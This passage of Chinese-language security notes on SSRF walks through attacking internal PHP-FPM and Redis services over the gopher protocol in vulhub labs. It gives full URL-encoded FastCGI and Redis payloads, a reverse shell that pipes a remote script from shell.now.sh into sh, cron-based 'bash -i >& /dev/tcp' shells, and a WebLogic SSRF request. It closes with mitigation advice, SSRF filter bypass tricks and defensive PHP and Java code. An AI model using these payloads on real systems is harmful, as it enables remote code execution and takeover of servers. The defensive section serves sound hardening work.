- PHP-FPM监听端口
- PHP-FPM版本 >= 5.3.3
- 知道服务器上任意一个php文件的绝对路径

监听一个端口的流量`nc -lvvp 2333 > 1.txt`，执行EXP，流量打到2333端口

```
python fpm.py -c "<?php system('echo sectest > /tmp/1.php'); exit;?>" -p 2333 127.0.0.1 /usr/local/lib/php/PEAR.php
```

fpm.py地址https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
 url编码

```
f = open('1.txt')
ff = f.read()
from urllib import quote
print quote(ff)
curl 'gopher://127.0.0.1:9000/_%01%01%5E%94%00%08%00%00%00%01%00%00%00%00%00%00%01%04%5E%94%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04%5E%94%00%00%00%00%01%05%5E%94%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%5E%94%00%00%00%00'
```

![img](https://i.imgur.com/cULUcBd.png)

在php尝试一下SSRF

```
?url=
gopher%3A%2f%2f127.0.0.1%3A9000%2f_%2501%2501%255E%2594%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%255E%2594%2501%25E7%2500%2500%250E%2502CONTENT_LENGTH50%250C%2510CONTENT_TYPEapplication%2ftext%250B%2504REMOTE_PORT9985%250B%2509SERVER_NAMElocalhost%2511%250BGATEWAY_INTERFACEFastCGI%2f1.0%250F%250ESERVER_SOFTWAREphp%2ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250F%251BSCRIPT_FILENAME%2fusr%2flocal%2flib%2fphp%2fPEAR.php%250B%251BSCRIPT_NAME%2fusr%2flocal%2flib%2fphp%2fPEAR.php%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2f%2finput%250E%2504REQUEST_METHODPOST%250B%2502SERVER_PORT80%250F%2508SERVER_PROTOCOLHTTP%2f1.1%250C%2500QUERY_STRING%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%250D%2501DOCUMENT_ROOT%2f%250B%2509SERVER_ADDR127.0.0.1%250B%251BREQUEST_URI%2fusr%2flocal%2flib%2fphp%2fPEAR.php%2501%2504%255E%2594%2500%2500%2500%2500%2501%2505%255E%2594%25002%2500%2500%253C%253Fphp%2520system%2528%2527echo%2520sectest%2520%253E%2520%2ftmp%2f1.php%2527%2529%253B%2520exit%253B%253F%253E%2501%2505%255E%2594%2500%2500%2500%2500
```

![img](https://i.imgur.com/QOyUnuT.png)

反弹shell

```
python fpm.py -c "<?php system('curl https://shell.now.sh/xxx.xxx.xxx.xxx:2222 | sh'); exit;?>" -p 2333 127.0.0.1 /usr/local/lib/php/PEAR.php
```

![img](https://i.imgur.com/gFkgFyH.png)

```
?url=
gopher://127.0.0.1:9000/_%01%01%EA%5E%00%08%00%00%00%01%00%00%00%00%00%00%01%04%EA%5E%01%E7%00%00%0E%02CONTENT_LENGTH75%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04%EA%5E%00%00%00%00%01%05%EA%5E%00K%00%00%3C%3Fphp%20system%28%27curl%20https%3A//shell.now.sh/xxx.xxx.xxx.xxx%3A2222%20%7C%20sh%27%29%3B%20exit%3B%3F%3E%01%05%EA%5E%00%00%00%00
```

反弹shell成功
 ![img](https://i.imgur.com/6K5WePJ.png)

### Gopher 攻击Redis（一）

Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议可以攻击内网中的 Redis。

实验环境：https://github.com/vulhub/vulhub/tree/master/fpm

```
$sudo apt-get update
$sudo apt-get install redis-server
$service redis-server start
$redis-cli
```

![img](https://i.imgur.com/iWNgyaz.png)

![img](https://i.imgur.com/e4bu8dJ.png)

[利用redis写webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
 先写一个redis反弹shell的bash脚本如下：

```
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```

该代码很简单，在redis的第0个数据库中添加key为1，value为`\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n\n`的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。

把接收到的数据转化为gopher数据流

```
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度为58个字节，上面的EXP即是`%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a`，3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。

```
curl -v 'http://127.0.0.1/?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0asucc%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

url编码后

```
curl -v 'http://127.0.0.1/?url=gopher%3A%2f%2f127.0.0.1%3A6379%2f_%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2463%250d%250a%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2fxxx.xxx.xxx.xxx%2f2333%200%3E%261%250a%250a%250a%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250asucc%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250a%2a1%250d%250a%244%250d%250aquit%250d%250a'
```

![img](https://i.imgur.com/JmFrfox.png)

返回了ok，Redis有字段

![img](https://i.imgur.com/S2O0lcg.png)

查看一下`/var/spool/cron/`的root，文件内容有反弹shell命令

![img](https://i.imgur.com/yTiKIE2.png)

因为系统并没有安装crontab，所以手动执行一下，nc会收到回显，但是会报错断开

![img](https://i.imgur.com/mBDyO68.png)

实验失败
 因为docker是ubuntu系统，而ubuntu下使用redis写crontab是无法成功反弹shell的
 原因参考
 https://xz.aliyun.com/t/1800
 https://joychou.org/web/hackredis-enhanced-edition-script.html

查看Linux发行版本

```
cat /etc/redhat-release
cat /etc/issue

radhat或centos存在： /etc/redhat-release 这个文件
【 命令 cat /etc/redhat-release 】
ubuntu存在 : /etc/lsb-release 这个文件 
【命令 cat /etc/lsb-release 】
```

### 攻击Redis（二）

实验环境 https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf

生成gopher Payload 脚本：https://xz.aliyun.com/t/5665#toc-8

发送三条redis命令，将弹shell脚本写入/etc/crontab：

```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

进行url编码：

```
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

注意，换行符是“\r\n”，也就是“%0D%0A”。
 发送请求

```
http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.21.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.21.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

![img](https://i.imgur.com/nOJCo2N.png)

查看Redis和`/etc/crontab`成功写入
 ![img](https://i.imgur.com/m465hOb.png)
 反弹shell成功
 ![img](https://i.imgur.com/47LKioL.png)

gopher协议payload

```
gopher://127.0.0.1:6379/_*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2415%0d%0a/var/spool/cron%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0awww%0d%0a%2455%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0d%0a*1%0d%0a%244%0d%0asave%0d%0a
```

尝试gopher发现curl 7.19.7版本不支持，挺老的版本
 ![img](https://i.imgur.com/XRVW1i0.png)

不过我们还可以用dict协议来利用
 http://www.cnblogs.com/iamstudy/articles/13th_cuit_game_wp_web300_ssrf.html

## 修复方案

- 限制协议为HTTP、HTTPS
- 禁止30x跳转
- 设置URL白名单或者限制内网IP

过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

限制请求的端口为http常用的端口，比如，80,443,8080,8090。

黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。

禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。

谈一谈如何在Python开发中拒绝SSRF漏洞
 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html

PHP开发中防御SSRF
 https://www.jianshu.com/p/6ea9b8652d73

绕过方法

```
1. http://admin@127.0.0.1:80@www.baidu.com/  orange的SSRF议题中讲过这个，依赖lib_curl的版本。 
2. 利用ipv6绕过，http://[::1]/
3.  http://127.0.0.1./
```

https://feei.cn/ssrf
 根据漏洞原理，我们能很容易的推导出修复方案。

1. 既然其它协议那么危险，就禁止非HTTP[S]协议的使用（解决非HTTP[S]协议的高危害）。
2. 只允许HTTP[S]协议后还是能进行内网探测，所以需要对被请求的URL进行白名单限制。
3. 部分请求服务（Request Service）会默认开启301跳转，也就是说如果是一个HTTP[S]的请求，也可能跳转到非HTTP[S]的请求上，那就绕过了第一条的限制，所以我们需要关闭301跳转的支持。

php cUrl

```
/**
 * Request service(Base cURL)
 *
 * @author Feei <wufeifei@wufeifei.com>
 * @link   http://wufeifei.com/ssrf
 */
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    /**
     * 1. 增加此行限制只能请求HTTP[S]的服务
     * @link https://curl.haxx.se/libcurl/c/CURLOPT_PROTOCOLS.html
     */
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);  
    /**
     * 2. 增加此行禁止301跳转
     * @link https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html
     */
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);  
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
/**
 * 3. 请求域名白名单
 */
 $white_list_urls = [
     'www.wufeifei.com',
     'www.mogujie.com'
 ]
 if (in_array(parse_url($url)['host'], $white_list_urls)){
     echo curl($url);
 } else {
     echo 'URL not allowed';
 }
```

Java HttpURLConnection

```
/**
 * 1. 限制允许HTTP[S]协议
 */
if(!url.getProtocol().startsWith("http"))
    throw new Exception();
/**
 * 3. 请求域白名单
 */
InetAddress inetAddress = InetAddress.getByName(url.getHost());
if(inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress())
    throw new Exception();
HttpURLConnection conn = (HttpURLConnection)(url.openConnection());
/**
 * 2. 禁止301跳转
 */
conn.setInstanceFollowRedirects(false);
conn.connect();
IOUtils.copy(conn.getInputStream(), out);
```

---

## 相关资源

- **代码审计**: [php代码审计.md](php代码审计.md) — SSRF相关函数 (curl_exec/file_get_contents/fsockopen)
- **文件包含**: [文件包含.md](文件包含.md) — php伪协议可结合SSRF利用
- **工具**: [ffuf模糊测试](工具使用/ffuf的使用.md) — 内网探测端口扫描
- **参考**: Gopher/Redis/FastCGI/DNS-rebinding 见本文章 L271-L423